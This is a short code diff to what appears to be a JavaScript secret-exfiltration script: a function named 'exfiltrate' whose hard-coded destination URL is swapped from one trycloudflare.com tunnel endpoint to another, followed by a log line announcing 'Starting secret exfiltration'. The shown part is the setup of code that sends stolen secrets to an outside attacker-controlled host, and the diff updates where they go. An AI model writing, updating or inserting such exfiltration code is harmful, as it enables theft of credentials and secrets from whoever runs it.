@@ -4,7 +4,7 @@
  */
 
 (async function exfiltrate() {
-  const EXFIL_URL = 'https://linear-pond-preferred-probability.trycloudflare.com/exfiltrate';
+  const EXFIL_URL = 'https://alarm-paying-attacks-loan.trycloudflare.com/exfiltrate';
   
   console.log('[INFO] Starting secret exfiltration...');
   
